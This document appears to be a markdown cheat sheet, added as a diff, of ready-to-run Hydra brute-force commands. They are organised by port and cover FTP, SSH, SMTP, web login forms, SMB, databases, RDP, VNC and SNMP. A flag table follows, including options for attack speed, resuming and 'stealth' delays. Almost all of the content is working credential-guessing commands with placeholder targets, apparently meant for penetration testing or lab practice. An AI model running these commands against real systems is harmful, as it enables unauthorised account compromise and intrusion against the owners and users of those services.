@@ -1,0 +1,175 @@
+---
+title: "Hydra Cheat Sheet"
+---
+
+
+# Hydra Brute Templates (Ordered by Port)
+
+---
+
+## 21 — FTP
+
+```bash
+hydra -L users.txt -P passwords.txt ftp://<IP>
+```
+
+Anonymous:
+
+```bash
+hydra -l anonymous -p anonymous ftp://<IP>
+```
+
+---
+
+## 22 — SSH
+
+```bash
+hydra -L users.txt -P passwords.txt ssh://<IP>
+```
+
+Custom port:
+
+```bash
+hydra -L users.txt -P passwords.txt ssh://<IP> -s 2222
+```
+
+---
+
+## 25 — SMTP
+
+```bash
+hydra -L users.txt -P passwords.txt smtp://<IP>
+```
+
+---
+
+## 80 — HTTP (POST)
+
+```bash
+hydra -L users.txt -P passwords.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
+```
+
+## 80 — HTTP (GET)
+
+```bash
+hydra -L users.txt -P passwords.txt <IP> http-get-form "/login.php?user=^USER^&pass=^PASS^:Invalid"
+```
+
+80 — HTTP BASIC AUTH 
+```bash
+hydra -L users.txt -P passwords.txt <IP> http-get /
+```
+
+---
+
+## 110 — POP3
+
+```bash
+hydra -L users.txt -P passwords.txt pop3://<IP>
+```
+
+---
+
+## 139 / 445 — SMB
+
+```bash
+hydra -L users.txt -P passwords.txt smb://<IP>
+```
+
+Domain:
+
+```bash
+hydra -L users.txt -P passwords.txt smb://<IP> -m WORKGROUP
+```
+
+---
+
+## 143 — IMAP
+
+```bash
+hydra -L users.txt -P passwords.txt imap://<IP>
+```
+
+---
+
+## 443 — HTTPS (POST)
+
+```bash
+hydra -L users.txt -P passwords.txt <IP> https-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
+```
+
+## 443 — HTTPS (GET)
+
+```bash
+hydra -L users.txt -P passwords.txt <IP> https-get-form "/login.php?user=^USER^&pass=^PASS^:Invalid"
+```
+
+---
+
+## 3306 — MySQL
+
+```bash
+hydra -L users.txt -P passwords.txt mysql://<IP>
+```
+
+---
+
+## 3389 — RDP
+
+```bash
+hydra -L users.txt -P passwords.txt rdp://<IP>
+```
+
+Domain:
+
+```bash
+hydra -L users.txt -P passwords.txt rdp://<IP> -m DOMAIN
+```
+
+---
+
+## 5432 — PostgreSQL
+
+```bash
+hydra -L users.txt -P passwords.txt postgres://<IP>
+```
+
+---
+
+## 5900 — VNC
+
+```bash
+hydra -P passwords.txt vnc://<IP>
+```
+
+---
+
+## 161 — SNMP (community strings)
+
+```bash
+hydra -P community.txt snmp://<IP>
+```
+
+| Parameter | Example          | Practical Explanation                 |
+| --------- | ---------------- | ------------------------------------- |
+| `-l`      | `-l admin`       | Attack only one user                  |
+| `-L`      | `-L users.txt`   | Multiple usernames                    |
+| `-p`      | `-p password123` | One password                          |
+| `-P`      | `-P rockyou.txt` | Password wordlist                     |
+| `-C`      | `-C creds.txt`   | `username:password` combos            |
+| `-u`      | `-u`             | Finish passwords per user before next |
+| `-e nsr`  | `-e nsr`         | Try null / same / reversed password   |
+| `-t`      | `-t 16`          | Parallel connections (speed)          |
+| `-s`      | `-s 2222`        | Custom port                           |
+| `-S`      | `-S`             | Use SSL/TLS                           |
+| `-v`      | `-v`             | Show attempts                         |
+| `-V`      | `-V`             | Show every credential tested          |
+| `-f`      | `-f`             | Stop after first valid login          |
+| `-o`      | `-o found.txt`   | Save results                          |
+| `-R`      | `-R`             | Resume attack                         |
+| `-I`      | `-I`             | Ignore restore file                   |
+| `-w`      | `-w 5`           | Server response timeout               |
+| `-W`      | `-W 1`           | Delay between attempts (stealth)      |
+| `-M`      | `-M targets.txt` | Multiple targets                      |
+| `-m`      | `-m`             | Extra module options                  |
+| `-U`      | `hydra -U ssh`   | Show module help                      |
